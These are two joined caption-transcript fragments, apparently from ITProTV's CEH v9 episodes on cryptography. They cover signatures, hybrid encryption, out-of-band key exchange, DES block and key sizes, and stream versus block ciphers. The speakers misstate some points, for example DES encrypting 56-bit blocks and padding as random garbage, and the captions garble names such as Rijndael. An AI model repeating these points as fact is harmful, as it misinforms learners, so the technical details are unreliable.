00:24:11.302\nNot violating the integrity of the key,\nbut\n\n501\n00:24:11.302 --> 00:24:15.033\nusing the value of the key being\nuniquely identified with Alice and\n\n502\n00:24:15.033 --> 00:24:18.950\nassociated with her,\nto then represent the identity to Bob.\n\n503\n00:24:18.950 --> 00:24:20.370\nBob gets the message.\n\n504\n00:24:20.370 --> 00:24:22.310\nBob says, this looks interesting.\n\n505\n00:24:22.310 --> 00:24:23.070\nWho's it from?\n\n506\n00:24:23.070 --> 00:24:24.410\nLet me validate that.\n\n507\n00:24:24.410 --> 00:24:28.090\nAnd Bob goes off and\ngets a copy of Alice's public key.\n\n508\n00:24:28.090 --> 00:24:33.610\nThe sender's public key has to be used\nto validate the key pair in the match.\n\n509\n00:24:33.610 --> 00:24:36.494\nIf we use Alice's public key,\nand it matches,\n\n510\n00:24:36.494 --> 00:24:41.414\nthen we know the signature is valid and\nas a result it must've been Alice's key.\n\n511\n00:24:41.414 --> 00:24:47.030\nAnd I'm being very specific when I say\nthis, Alice's private key that was used.\n\n512\n00:24:47.030 --> 00:24:49.810\nRemember, we don't know if Alice's\nidentity has been subsumed by\n\n513\n00:24:49.810 --> 00:24:54.050\nthe attacker, so we can't validate\nthat it was really Alice that sent it.\n\n514\n00:24:54.050 --> 00:24:57.240\nBut we can validate that\nAlice's credentials were used.\n\n515\n00:24:57.240 --> 00:24:59.280\nAnd that's really what we need\nto understand about that.\n\n516\n00:24:59.280 --> 00:25:01.800\nNow we assume, right, in the transmission\n\n517\n00:25:01.800 --> 00:25:05.500\nthat it was also Alice who sent it as\nopposed to just Alice's credentials.\n\n518\n00:25:05.500 --> 00:25:07.970\nBut remember, we would have to\nuse additional mechanisms and\n\n519\n00:25:07.970 --> 00:25:11.195\nmethods to really ensure that\nAlice's hands were on the keyboard.\n\n520\n00:25:11.195 --> 00:25:12.157\n>> Mm-hm.\n>> Otherwise we have\n\n521\n00:25:12.157 --> 00:25:13.397\na minority report situation-\n>> Yes.\n\n522\n00:25:13.397 --> 00:25:14.830\n[LAUGH]\n>> And that can get ugly,\n\n523\n00:25:14.830 --> 00:25:16.365\nnot to mention messy, right?\n\n524\n00:25:16.365 --> 00:25:18.418\n>> [LAUGH] So\ndon't want that to happen, right.\n\n525\n00:25:18.418 --> 00:25:19.114\n>> No, no.\n\n526\n00:25:19.114 --> 00:25:22.430\n>> All right, so we did proof of origin,\nwhat else do we have up there?\n\n527\n00:25:22.430 --> 00:25:24.725\n>> Well, we can kind of tie it\nall together and I guess and\n\n528\n00:25:24.725 --> 00:25:26.459\nthat would be another question for you or\n\n529\n00:25:26.459 --> 00:25:29.370\nsomething that we ought to discuss\nthen cuz we can't combine this.\n\n530\n00:25:29.370 --> 00:25:32.710\nWe said that in that method we just\ntalked about, proof of origin,\n\n531\n00:25:32.710 --> 00:25:34.940\nthe message itself is not encrypted.\n\n532\n00:25:34.940 --> 00:25:36.260\nSo that's still visible.\n\n533\n00:25:36.260 --> 00:25:39.870\nThere is no confidentiality being implied\nbut we could combine those methods, right.\n\n534\n00:25:39.870 --> 00:25:42.860\nWe could take what we talked about\nwith asymmetric encryption providing\n\n535\n00:25:42.860 --> 00:25:48.240\nconfidentiality as well as proof of\norigin to provide the proof of origin or\n\n536\n00:25:48.240 --> 00:25:49.080\nthe non-repudiation.\n\n537\n00:25:49.080 --> 00:25:50.280\nWe can put them together and\ndo both, right?\n\n538\n00:25:50.280 --> 00:25:52.308\n>> We could.\nWe would call that hybrid cryptography,\n\n539\n00:25:52.308 --> 00:25:53.520\nright, and we would do both.\n\n540\n00:25:53.520 --> 00:25:54.375\nAnd so do we have a diagram for that, sir?\n\n541\n00:25:54.375 --> 00:25:55.632\n>> We do.\n\n542\n00:25:55.632 --> 00:25:56.210\n>> That's a good setup.\n\n543\n00:25:56.210 --> 00:25:58.007\n>> We're just gonna-\n>> We had one but then it went away.\n\n544\n00:25:58.007 --> 00:25:58.590\nAll right, there we go.\n\n545\n00:25:58.590 --> 00:25:59.103\n>> There we go.\n\n546\n00:25:59.103 --> 00:26:02.870\n>> So Mike's just gotta zoom in and zoom\nout, just kinda resize that a little bit.\n\n547\n00:26:02.870 --> 00:26:05.590\nSo just while Mike gets that\nkinda teed up on the screen.\n\n548\n00:26:05.590 --> 00:26:10.790\nSo to Mike's point, we can combine the two\nmechanisms, right, because if we just do\n\n549\n00:26:10.790 --> 00:26:14.780\nproof of origin and non-repudiation,\nwe essentially are sending a message in\n\n550\n00:26:14.780 --> 00:26:18.540\nthe open, or in the clear but\nwe're validating the sender's identity.\n\n551\n00:26:18.540 --> 00:26:22.770\nIf we just do a [COUGH]\nmessage that is encrypted and\n\n552\n00:26:22.770 --> 00:26:26.200\nwe are sending the encrypted\nmessage to create confidentiality,\n\n553\n00:26:26.200 --> 00:26:29.250\nwe're doing something that's important but\nwe have no way of knowing for\n\n554\n00:26:29.250 --> 00:26:33.710\nsure that the originator of the message,\nthe sender, is a valid individual, right.\n\n555\n00:26:33.710 --> 00:26:35.490\nThis happens with phishing all the time.\n\n556\n00:26:35.490 --> 00:26:39.700\nFor instance, we will talk about social\nengineering and some of those episodes.\n\n557\n00:26:39.700 --> 00:26:43.820\nWe talked about the fact that you can\nsend phishing emails purporting to be\n\n558\n00:26:43.820 --> 00:26:46.700\nfrom a person inside the company and\nmake them look legitimate.\n\n559\n00:26:46.700 --> 00:26:49.520\nSo without proof of origin\nthat can be a problem.\n\n560\n00:26:49.520 --> 00:26:53.870\nBut if we send them confidentially\nwithout proof of origin,\n\n561\n00:26:53.870 --> 00:26:55.400\nsomebody may actually try to spoof.\n\n562\n00:26:55.400 --> 00:26:59.570\nAnd I told you that one of those early\nepisodes we had discussed the story about\n\n563\n00:26:59.570 --> 00:27:03.860\none of my clients who had that happen\nwhere the CEO was impersonated, right?\n\n564\n00:27:03.860 --> 00:27:08.800\nAnd the HR function got an email saying,\nhey, we need you to submit all the W2 and\n\n565\n00:27:08.800 --> 00:27:13.520\nW9 information for all our vendors and\nfor all of our employees for\n\n566\n00:27:13.520 --> 00:27:15.050\nsome sort of audit.\n\n567\n00:27:15.050 --> 00:27:16.570\nAnd then essentially and\n\n568\n00:27:16.570 --> 00:27:19.315\nall that stuff was sent out of\nthe organization to a hacker.\n\n569\n00:27:19.315 --> 00:27:19.850\n>> Mm.\n\n570\n00:27:19.850 --> 00:27:21.640\n>> So you don't want that to happen.\n\n571\n00:27:21.640 --> 00:27:25.270\n>> Yeah, right, so that can obviously\nbe a really bad thing, a bad outcome.\n\n572\n00:27:25.270 --> 00:27:27.120\nSo we're going to combine the two.\n\n573\n00:27:27.120 --> 00:27:30.635\nBut what we're going to do is\nessentially use both non-repudiation and\n\n574\n00:27:30.635 --> 00:27:32.659\nintegrity along with confidentiality.\n\n575\n00:27:32.659 --> 00:27:36.370\nSo on the left here we have Alice, right.\n\n576\n00:27:36.370 --> 00:27:37.790\nWe have the attacker.\n\n577\n00:27:37.790 --> 00:27:40.381\nThe attacker is busy, he's running around\nbetween two different systems there.\n\n578\n00:27:40.381 --> 00:27:43.552\nAnd so\nwe have Alice trying to send to Bob, and\n\n579\n00:27:43.552 --> 00:27:48.892\nwe are using Bob's public key, right,\nto be able to, as you can see there,\n\n580\n00:27:48.892 --> 00:27:54.940\ndo the secure send of the message with\nthe confidentiality protection, right?\n\n581\n00:27:54.940 --> 00:27:59.428\nSo Alice is gonna use recipients for\nthe sender, is gonna use the recipient's\n\n582\n00:27:59.428 --> 00:28:03.780\npublic key and is going to send the\nmessage with confidentiality protection\n\n583\n00:28:03.780 --> 00:28:08.190\nand then force the recipient to\nuse their private key to decrypt.\n\n584\n00:28:08.190 --> 00:28:12.424\nNow, when we do that, what we then also\nhave to think about is that if we wanna\n\n585\n00:28:12.424 --> 00:28:17.057\nadd the integrity, non-repudiation,\nthen we're gonna both digitally sign and\n\n586\n00:28:17.057 --> 00:28:20.980\nencrypt the message cuz we only\nencrypted on the left side so far.\n\n587\n00:28:20.980 --> 00:28:24.720\n>> Yeah, in my drawing you really would\nwant to think of superimposing these\n\n588\n00:28:24.720 --> 00:28:26.420\nwhere they are both being\ndone at the same time.\n\n589\n00:28:26.420 --> 00:28:29.630\n>> What you would do, essentially, this is\na selection you make in your email client,\n\n590\n00:28:29.630 --> 00:28:30.600\nwhatever it is.\n\n591\n00:28:30.600 --> 00:28:35.100\n>> There's either one checkbox or\none button you push, or two checkboxes, or\n\n592\n00:28:35.100 --> 00:28:40.360\ntwo buttons you push, or there may be\nradio buttons where it's encrypt only,\n\n593\n00:28:40.360 --> 00:28:42.090\nsign only, or one that does both.\n\n594\n00:28:42.090 --> 00:28:45.280\nThere's different ways to do it based\non the client, but essentially,\n\n595\n00:28:45.280 --> 00:28:48.950\nI used to love the MAPI client in Outlook,\nthe full desktop client, cuz they had\n\n596\n00:28:48.950 --> 00:28:51.899\nthe little state fair ribbons,\nthe red ribbons and the blue ribbons.\n\n597\n00:28:51.899 --> 00:28:53.655\nSo red would be for something,\nblue would be for something.\n\n598\n00:28:53.655 --> 00:28:54.669\nYou click on one.\n\n599\n00:28:54.669 --> 00:28:57.599\nAnd so however you do this,\nMike is absolutely right,\n\n600\n00:28:57.599 --> 00:29:01.167\nyou would essentially impose\nboth diagrams, right, together,\n\n601\n00:29:01.167 --> 00:29:05.235\nbecause the reality is you're gonna\ndo both of these simultaneously.\n\n602\n00:29:05.235 --> 00:29:07.475\nSo we would digitally sign and encrypt.\n\n603\n00:29:07.475 --> 00:29:10.885\nAnd so Alice would digitally\nsign with her private key.\n\n604\n00:29:10.885 --> 00:29:15.055\nBut then Alice would send the message\nwith the recipient's public key,\n\n605\n00:29:15.055 --> 00:29:17.305\nwith Bob's public key,\ndoing both together.\n\n606\n00:29:17.305 --> 00:29:19.085\nIt's gonna allow us to do that, right.\n\n607\n00:29:19.085 --> 00:29:22.815\nAnd so we could blend the two together,\ncreating the opportunity to do both of\n\n608\n00:29:22.815 --> 00:29:24.865\nthese or\ncarry out both of these activities.\n\n609\n00:29:24.865 --> 00:29:30.610\nNow if we have to just send a private key,\na symmetric key, as I described earlier,\n\n610\n00:29:30.610 --> 00:29:34.640\nso we combine the two, if we have to\nsend the private key to somebody,\n\n611\n00:29:34.640 --> 00:29:38.910\nright, to allow them to unencrypt\nsymmetrically encrypted data but\n\n612\n00:29:38.910 --> 00:29:41.710\nasymmetrically encrypt the key,\nwe could do that as well.\n\n613\n00:29:41.710 --> 00:29:43.211\nThat's a little variant\nto what we're doing here,\n\n614\n00:29:43.211 --> 00:29:44.380\ncuz this really is just all about email.\n\n615\n00:29:44.380 --> 00:29:47.139\n>> Right.\n>> Generically we could do a key exchange,\n\n616\n00:29:47.139 --> 00:29:51.432\nwhere we symmetrically encrypt a large\nvolume of data with a symmetric key,\n\n617\n00:29:51.432 --> 00:29:52.698\nprivate key.\n\n618\n00:29:52.698 --> 00:29:58.290\nWe then re-encrypt that private key with\nan asymmetric public private key pair.\n\n619\n00:29:58.290 --> 00:30:05.290\nAnd if we do that, what we're gonna\ndo is we're gonna take the private\n\n620\n00:30:05.290 --> 00:30:09.460\nkey that we're going to use, we're going\nto encrypt it with an asymmetric system.\n\n621\n00:30:09.460 --> 00:30:12.045\nWe're going to take the recipient's,\nright.\n\n622\n00:30:12.045 --> 00:30:12.760\n>> Mh-hm.\n\n623\n00:30:12.760 --> 00:30:16.740\n>> Key, we're gonna take the recipient's\npublic key that we wanna send\n\n624\n00:30:16.740 --> 00:30:21.640\nthe symmetric key to and use it to\nthen be able to drive the encryption.\n\n625\n00:30:21.640 --> 00:30:24.610\nBecause then what will happen\nis only the recipient's\n\n626\n00:30:24.610 --> 00:30:27.990\nprivate key that matches the key pair\ncan be used to unencrypt the message\n\n627\n00:30:27.990 --> 00:30:30.810\nwhich has the key associated\nwith it as the data.\n\n628\n00:30:30.810 --> 00:30:35.370\nAnd so we can securely transmit the\nsymmetric key as well essentially using\n\n629\n00:30:35.370 --> 00:30:39.660\na similar thought process by combining\nsymmetric and asymmetric systems together.\n\n630\n00:30:39.660 --> 00:30:44.165\n>> That sounds a lot like something we\nuse when we connect to secure websites.\n\n631\n00:30:44.165 --> 00:30:45.260\nIt would be.\n\n632\n00:30:45.260 --> 00:30:48.870\nEssentially, it's the same exact\nthought process or concept, absolutely.\n\n633\n00:30:48.870 --> 00:30:50.352\nWhat else do we have up there,\ncuz I just can't see the top?\n\n634\n00:30:50.352 --> 00:30:52.866\n>> I just said, the only thing we\nhave left I think is add a band.\n\n635\n00:30:52.866 --> 00:30:54.640\n>> Add a band, okay.\n>> Which we kinda talked about.\n\n636\n00:30:54.640 --> 00:30:55.183\n>> We did.\nSo\n\n637\n00:30:55.183 --> 00:30:58.830\njust to illustrate the concept since\nwe have a little diagram up there.\n\n638\n00:30:58.830 --> 00:31:01.510\nSo the idea is we have Alice\nover there on the left, right?\n\n639\n00:31:01.510 --> 00:31:06.410\nShe's got her data and a key,\na symmetric key that goes with it, right,\n\n640\n00:31:06.410 --> 00:31:11.120\nand she wants to send that key to Bob\nto make sure he can unencrypt and read\n\n641\n00:31:11.120 --> 00:31:15.510\nthe data after she sends it to him because\nit's been encrypted with her private key.\n\n642\n00:31:15.510 --> 00:31:19.260\nThe attacker's obviously trying\nto bleed both those message and\n\n643\n00:31:19.260 --> 00:31:21.290\nkey transmissions out of the system.\n\n644\n00:31:21.290 --> 00:31:25.510\nSo Alice would have to send the message\nfirst, and then somehow send the key\n\n645\n00:31:25.510 --> 00:31:28.340\nseparately, right, in some sort\nof alternate transmission method.\n\n646\n00:31:28.340 --> 00:31:31.688\n>> I think in this drawing,\nwhat I was trying to demonstrate here,\n\n647\n00:31:31.688 --> 00:31:35.966\nwas if the attacker has access to whatever\nmeans you use to send the message, If you\n\n648\n00:31:35.966 --> 00:31:39.090\nsend the key using that same channel-\n>> The key gets compromised.\n\n649\n00:31:39.090 --> 00:31:40.790\n>> Yeah, most likely he's\ngonna get the key as well.\n\n650\n00:31:40.790 --> 00:31:43.770\nSo just that's trying to prove\nthe point that you gotta use some\n\n651\n00:31:43.770 --> 00:31:46.300\nother channel to get that\nkey to the other end.\n\n652\n00:31:46.300 --> 00:31:47.630\n>> Or we just get rid of the attacker.\n\n653\n00:31:47.630 --> 00:31:48.760\n>> Or we just kill the attacker.\n\n654\n00:31:48.760 --> 00:31:52.210\n>> That's the point I would take away\nfrom that myself, but that's just me,\n\n655\n00:31:52.210 --> 00:31:53.470\ncuz I'm bitter.\n\n656\n00:31:53.470 --> 00:31:54.520\nWhat can I say?\n\n657\n00:31:54.520 --> 00:31:57.490\nAll right, so we wanna make sure\nwe understand that as well.\n\n658\n00:31:57.490 --> 00:31:58.530\nIt's very important.\n\n659\n00:31:58.530 --> 00:31:59.150\nAll right, very good.\n\n660\n00:31:59.150 --> 00:32:00.360\nSo we've gone through,\n\n661\n00:32:00.360 --> 00:32:04.680\nwe've talked about all the different ways\nin which we can send, essentially we can\n\n662\n00:32:04.680 --> 00:32:09.720\ntransmit these keys, and the different\nways in which we can exchange information.\n\n663\n00:32:09.720 --> 00:32:13.950\nHopefully that helps you to have a better\nsense of the ways in which we can do this.\n\n664\n00:32:13.950 --> 00:32:18.970\nWhat we're gonna do in an upcoming episode\nis talk about some of the algorithms that\n\n665\n00:32:18.970 --> 00:32:24.280\nplay into this, DES, AES, RSA,\nsome of the hashing algorithms,\n\n666\n00:32:24.280 --> 00:32:28.830\nMD5, SHA-1, we mentioned them, we'll\ngo through them quickly, set them up,\n\n667\n00:32:28.830 --> 00:32:31.930\ntalk to you about what they are, how\nthey're structured, things of that nature.\n\n668\n00:32:31.930 --> 00:32:35.860\nWe're then gonna link that to attacks and\ndefine those different attack types,\n\n669\n00:32:35.860 --> 00:32:38.890\nchosen cipher text,\nchosen plain text, rubber hose,\n\n670\n00:32:38.890 --> 00:32:40.920\nthat's always a favorite of mine.\n\n671\n00:32:40.920 --> 00:32:43.850\nSo all of those kind of attacks,\nwe'll go through all that as well.\n\n672\n00:32:43.850 --> 00:32:45.900\nAnd then we're gonna do a little show and\ntell as well,\n\n673\n00:32:45.900 --> 00:32:48.660\nso we'll do a little bit of\nthat in our upcoming episode.\n\n674\n00:32:48.660 --> 00:32:51.380\n>> All right, looking forward to that but\nas far as this episode goes,\n\n675\n00:32:51.380 --> 00:32:52.595\nthat's gonna do it for this one.\n\n676\n00:32:52.595 --> 00:32:57.390\nNow we took a really good look at\ncryptography and just the way that works\n\n677\n00:32:57.390 --> 00:33:02.120\nif we wanna do non-repudiation or proof\nof origin, symmetric versus asymmetric.\n\n678\n00:33:02.120 --> 00:33:03.560\nAnd as Adam told us at the very beginning,\n\n679\n00:33:03.560 --> 00:33:05.620\nwe're trying to get that\nvisual representation,\n\n680\n00:33:05.620 --> 00:33:07.200\ntry to make all the words make sense.\n\n681\n00:33:07.200 --> 00:33:09.100\nWe appreciate that, Adam,\nthank you for that one.\n\n682\n00:33:09.100 --> 00:33:13.360\nHope everybody out there enjoyed watching,\nsigning off for ITProTV, I'm Mike Rodrick.\n\n683\n00:33:13.360 --> 00:33:14.025\n>> I'm Alice.\n\n684\n00:33:14.025 --> 00:33:16.441\n>> [LAUGH] And we'll see you next time.\n\n685\n00:33:16.441 --> 00:33:22.228\n[SOUND]\n\n",

00:00:13.701\nat ITPRO TV, am your host Mike Rodrick.\n\n4\n00:00:16.950 --> 00:00:19.341\nAnd today we are doing\nCEH version nine and\n\n5\n00:00:19.341 --> 00:00:23.450\nspecifically this episode we gonna\nbe looking again at cryptography.\n\n6\n00:00:23.450 --> 00:00:26.660\nWe've already taken a good\nlook at what cryptography is.\n\n7\n00:00:26.660 --> 00:00:30.670\nWe've spent an entire episode defining\na lot of terminology that we need to\n\n8\n00:00:30.670 --> 00:00:32.422\nunderstand about cryptography.\n\n9\n00:00:32.422 --> 00:00:34.670\nThere's been an episode going over,\n\n10\n00:00:34.670 --> 00:00:38.010\njust trying to visualize some of the\nconcepts that we've been talking about.\n\n11\n00:00:38.010 --> 00:00:39.450\nAnd now we're gonna continue on and\n\n12\n00:00:39.450 --> 00:00:42.760\ntalk about some of the different\nalgorithms involved in cryptography.\n\n13\n00:00:42.760 --> 00:00:44.970\nAnd here to help us with that,\nis Mr. Adam Gordon.\n\n14\n00:00:44.970 --> 00:00:45.950\nHow are you doing, Adam?\n\n15\n00:00:45.950 --> 00:00:47.590\n>> Good, good, I am doing well,\nI'm doing well.\n\n16\n00:00:47.590 --> 00:00:50.900\nSo, we're going to spend a little\ntime talking about some of\n\n17\n00:00:50.900 --> 00:00:52.880\nthe key algorithms that are involved.\n\n18\n00:00:52.880 --> 00:00:56.200\nNot all of them,\nthere's a huge laundry list of algorithms.\n\n19\n00:00:56.200 --> 00:00:57.960\nA lot of them are used regularly.\n\n20\n00:00:57.960 --> 00:00:59.760\nA lot of them you may never even heard of.\n\n21\n00:00:59.760 --> 00:01:02.108\nTwo fish, red fish,\nblue fish for instance.\n\n22\n00:01:02.108 --> 00:01:04.376\n>> [LAUGH]\n>> The Dr. Seuss or Theodore Geisel.\n\n23\n00:01:04.376 --> 00:01:06.700\nI've heard them say you can get it for\nFather's day.\n\n24\n00:01:06.700 --> 00:01:08.880\nGreat gift to give people if you\nare looking for something to do.\n\n25\n00:01:08.880 --> 00:01:12.040\nBut, we're gonna talk about\nsome of the more common ones.\n\n26\n00:01:12.040 --> 00:01:14.170\nDES, the Data Encryption Standard.\n\n27\n00:01:14.170 --> 00:01:19.080\nAES, the Advanced Encryption Standard,\nnormally referred to as AES, but\n\n28\n00:01:19.080 --> 00:01:21.470\nformally referred to\nthe region dal algorithm.\n\n29\n00:01:21.470 --> 00:01:24.060\nWe'll talk about the RC Series,\nRC4, RC5, RC6, and\n\n30\n00:01:24.060 --> 00:01:27.890\ntalk about some of the subtle, but\nimportant differences between them.\n\n31\n00:01:27.890 --> 00:01:33.300\nSo, for instance, do you know that in the\nRC series, RC4 is implemented as one type?\n\n32\n00:01:33.300 --> 00:01:34.950\nStream or block, you get to choose.\n\n33\n00:01:34.950 --> 00:01:38.880\nWhereas RC5 is implemented differently and\nRC6 is implemented differently as well.\n\n34\n00:01:38.880 --> 00:01:41.550\nSo there's not standardization\nthrough that particular subset.\n\n35\n00:01:41.550 --> 00:01:44.690\n>> Gotcha.\n>> Whereas DES is implemented and\n\n36\n00:01:44.690 --> 00:01:49.070\nwe've talked about DES before as kind\nof a, and it's actually held up so\n\n37\n00:01:49.070 --> 00:01:51.660\nto speak as being\nthe prototypical block cipher.\n\n38\n00:01:51.660 --> 00:01:54.580\nWe think about DES as\nbeing that prototypical\n\n39\n00:01:54.580 --> 00:01:59.040\nalgorithm from a cryptographic perspective\nthat represents the use of block ciphers,\n\n40\n00:01:59.040 --> 00:02:03.000\nwhereas we think about AAS as being that\nprototypical solution or at least we\n\n41\n00:02:03.000 --> 00:02:07.815\nthink of it as being the one that is more\noften than not going to replace this.\n\n42\n00:02:07.815 --> 00:02:11.380\nIt is a block as well, but then we think\nabout stream ciphers and how those differ.\n\n43\n00:02:11.380 --> 00:02:14.126\nIt's kind of interesting when you\nstart digging into the history of some\n\n44\n00:02:14.126 --> 00:02:14.950\nof this stuff.\n\n45\n00:02:14.950 --> 00:02:18.430\nSo DES has been around for a long time,\nthe data encryption standard.\n\n46\n00:02:18.430 --> 00:02:22.190\nWe normally think of DES as being 3-DES or\nTriple DES,\n\n47\n00:02:22.190 --> 00:02:24.260\nwhich is what you often\nhear it referred to as.\n\n48\n00:02:24.260 --> 00:02:26.270\nBut DES actually existed\nin three iterations,\n\n49\n00:02:26.270 --> 00:02:29.900\nDES, double DES which really\ndidn't get used much at all.\n\n50\n00:02:29.900 --> 00:02:31.870\nAnd we jump then to triple DES.\n\n51\n00:02:31.870 --> 00:02:33.740\nTriple DES was used for years.\n\n52\n00:02:33.740 --> 00:02:36.010\nWe don't use it any more, formally,\n\n53\n00:02:36.010 --> 00:02:38.740\nbecause it has been proven\nto be vulnerable to attack.\n\n54\n00:02:38.740 --> 00:02:41.230\nSo we moved to AES several years ago.\n\n55\n00:02:41.230 --> 00:02:45.420\nBut DES is going to allow\nus to do enciphering and\n\n56\n00:02:45.420 --> 00:02:47.720\ndeciphering using a block thought process.\n\n57\n00:02:47.720 --> 00:02:49.370\nLet's talk about block cyphers for\na minute and\n\n58\n00:02:49.370 --> 00:02:51.070\nthe difference between block and stream.\n\n59\n00:02:51.070 --> 00:02:52.980\nSo when we think about block cyphers,\n\n60\n00:02:52.980 --> 00:02:58.190\nwe think about a cypher that is going\nto take a bucket of bits, a B of B.\n\n61\n00:02:58.190 --> 00:02:59.725\nAlmost like Airbnb, right?\n\n62\n00:02:59.725 --> 00:03:01.090\n>> [LAUGH]\n>> A bucket of bits\n\n63\n00:03:01.090 --> 00:03:03.790\nthat are going to be\nspecified at a certain size.\n\n64\n00:03:03.790 --> 00:03:06.300\nSo imagine we have a square, right?\n\n65\n00:03:06.300 --> 00:03:07.640\nAnd inside that square, or\n\n66\n00:03:07.640 --> 00:03:10.700\nin that bucket, we're gonna only be\nable to fit a certain amount of bits.\n\n67\n00:03:10.700 --> 00:03:14.622\nIn the case of DES,\nthat will be 64 bits, right?\n\n68\n00:03:14.622 --> 00:03:16.559\nAnd we're gonna put 64\nbits in that bucket.\n\n69\n00:03:16.559 --> 00:03:20.197\nBut we're gonna take eight bits out of\nthat bucket and not use them to represent\n\n70\n00:03:20.197 --> 00:03:24.182\ndata, but rather, we're gonna use them for\nsome other stuff, error control and\n\n71\n00:03:24.182 --> 00:03:28.120\ncorrection, and some control mechanisms\nassociated with the algorithm.\n\n72\n00:03:28.120 --> 00:03:32.630\nAnd so we're actually gonna\nhave DES operating as a 64 bit\n\n73\n00:03:32.630 --> 00:03:36.890\nalgorithm from a block perspective,\nbut we call it a 56 bit true,\n\n74\n00:03:36.890 --> 00:03:42.600\nbecause the 56 bits or the bucket is\nunder the control of at 56 bit key.\n\n75\n00:03:42.600 --> 00:03:47.579\nSo DES actually uses 56 bits in its key\nsize to be able to encrypt and decrypt.\n\n76\n00:03:47.579 --> 00:03:52.419\nAnd so when we think about DES,\nwe say DES is a 56 bit algorithm,\n\n77\n00:03:52.419 --> 00:03:56.115\ndouble DES is 56 bits times two,\nor 112 bit.\n\n78\n00:03:56.115 --> 00:04:00.915\nAnd we say triple DES, 56 bits times 3,\nI don't have enough fingers and\n\n79\n00:04:00.915 --> 00:04:03.455\ntoes, but\nlast time I checked that was 168, right?\n\n80\n00:04:03.455 --> 00:04:06.383\nI would need to have several people,\nwe would need Bob and\n\n81\n00:04:06.383 --> 00:04:11.915\nAlice to come help us out, but we have 168\nbits, so when we talk about triple DES,\n\n82\n00:04:11.915 --> 00:04:16.595\nwe talk about it being 168 bit key size or\n168 bit algorithm that we use.\n\n83\n00:04:16.595 --> 00:04:18.945\nSo, wanna think about that.\n\n84\n00:04:18.945 --> 00:04:23.975\nTriple DES is what was used, but it’s\na block cypher so it puts those bits into\n\n85\n00:04:23.975 --> 00:04:27.795\ncages or buckets, if you will,\nthat are of a specific size and\n\n86\n00:04:27.795 --> 00:04:30.575\nare replicated at that\nsize all the way through.\n\n87\n00:04:30.575 --> 00:04:35.370\nAnd then we operate on those blocks\nof text or those blocks of bits.\n\n88\n00:04:35.370 --> 00:04:37.950\nAnd so when we go to encrypt or\ndecrypt with DES,\n\n89\n00:04:37.950 --> 00:04:41.670\nwe do that in a block\nof 56 bits at a time.\n\n90\n00:04:41.670 --> 00:04:46.400\nOr 64 bits, or 24 bits, or\n112 bits, whatever the bit size is.\n\n91\n00:04:46.400 --> 00:04:47.320\nIt doesn't matter.\n\n92\n00:04:47.320 --> 00:04:51.860\nWe may have a variable size in the block,\nbut the point is we have a fixed size\n\n93\n00:04:51.860 --> 00:04:55.550\nonce we set that and\nthat size is what we always will use.\n\n94\n00:04:55.550 --> 00:04:58.220\nSo that brings up an interesting thought\nprocess which is what if we don't have\n\n95\n00:04:58.220 --> 00:05:00.630\nenough bits to round out the block?\n\n96\n00:05:00.630 --> 00:05:04.501\nLet's say we're supposed to have\n56 bits and we only have 48.\n\n97\n00:05:04.501 --> 00:05:05.320\nWhat do we do?\n\n98\n00:05:05.320 --> 00:05:07.100\nWe have to do what's called padding,\nright?\n\n99\n00:05:07.100 --> 00:05:11.120\nWe have to add some bits in to bring the\nblock up to full size, because the only\n\n100\n00:05:11.120 --> 00:05:14.600\nway the system works is if we operate\non blocks that are fully formed.\n\n101\n00:05:14.600 --> 00:05:18.730\nSo we have to pad certain blocks in\norder to make sure they are full size.\n\n102\n00:05:18.730 --> 00:05:21.540\nPadding is just randomly\nadding garbage in.\n\n103\n00:05:21.540 --> 00:05:23.130\nThat is nonsensical.\n\n104\n00:05:23.130 --> 00:05:25.597\nBut is there is basically\npacking material right?\n\n105\n00:05:25.597 --> 00:05:27.040\n>> Right.\n>> Think of like pouring peanuts into\n\n106\n00:05:27.040 --> 00:05:30.480\nthe box to make sure that nothing\nbangs around in there and gets broken.\n\n107\n00:05:30.480 --> 00:05:31.350\nThat's what we're doing.\n\n108\n00:05:31.350 --> 00:05:34.180\nSo if a block is not fully formed,\nwe're padding it.\n\n109\n00:05:34.180 --> 00:05:40.070\nNow, in a stream cipher we don't have to\nworry about chunking the data into blocks.\n\n110\n00:05:40.070 --> 00:05:42.840\nRather, we operate on the bits as\nthey go through one at time and\n\n111\n00:05:42.840 --> 00:05:47.880\nessentially continuously are encrypting or\ncontinuously decrypting bits on the fly.\n\n112\n00:05:47.880 --> 00:05:50.230\nSo a stream cipher works\non the thought process or\n\n113\n00:05:50.230 --> 00:05:54.020\nthe principle of drinking from the fire\nhose, just a continuous stream of bits.\n\n114\n00:05:54.020 --> 00:05:57.330\nWhereas a block site works on\nthe principle of packaging up\n\n115\n00:05:57.330 --> 00:06:00.920\na series of bits and then pushing\nthem forward to be operated on, and\n\n116\n00:06:00.920 --> 00:06:02.970\nthen packaging another group and\npushing them forward.\n\n117\n00:06:02.970 --> 00:06:05.986\nDid you ever see the video,\nGood Warriors of the .net?\n\n118\n00:06:05.986 --> 00:06:07.110\n>> No, I think we talked about that?\n\n119\n00:06:07.110 --> 00:06:09.590\n>> We talked about before, but\nyou've never taken a look at it.\n\n120\n00:06:09.590 --> 00:06:10.620\n>> Never had a chance, no.\n\n121\n00:06:10.620 --> 00:06:12.210\n>> Rick and Morty, good worries with that.\n\n122\n00:06:12.210 --> 00:06:14.020\nYour list is getting pretty long there,\nmy friend.\n\n123\n00:06:14.020 --> 00:06:15.428\n>> It is.\n>> You're gonna be on Netflix binge\n\n124\n00:06:15.428 --> 00:06:16.660\nwatching this the rest of this week.\n\n125\n00:06:16.660 --> 00:06:17.790\n>> Gonna need a three day weekend for\nthis.\n\n126\n00:06:17.790 --> 00:06:20.990\n>> You do, so if you've never seen it\nout there, by the way, Mike can go out.\n\n127\n00:06:20.990 --> 00:06:22.798\nHe can, if you don't mind,\nmaybe while we're talking.\n\n128\n00:06:22.798 --> 00:06:25.278\nNot to play, maybe just nine minutes,\nmaybe just find the link to it, so\n\n129\n00:06:25.278 --> 00:06:26.730\nwe can just throw it up to everybody.\n\n130\n00:06:26.730 --> 00:06:29.270\nIt's a great video,\nI use it with my network plus and\n\n131\n00:06:29.270 --> 00:06:32.850\nmy entry level kind of networking classes,\nand I use it and I give it to people when\n\n132\n00:06:32.850 --> 00:06:36.890\nthey need a basic concept, a basic\nunderstanding of how networking works.\n\n133\n00:06:36.890 --> 00:06:39.840\nIt was done by Ericsson Labs,\nit's an automated short.\n\n134\n00:06:39.840 --> 00:06:42.170\nIt's about nine minutes long,\nit's really cool.\n\n135\n00:06:42.170 --> 00:06:46.960\nIt breaks down the ideas into a really,\neasily approachable format.\n\n136\n00:06:46.960 --> 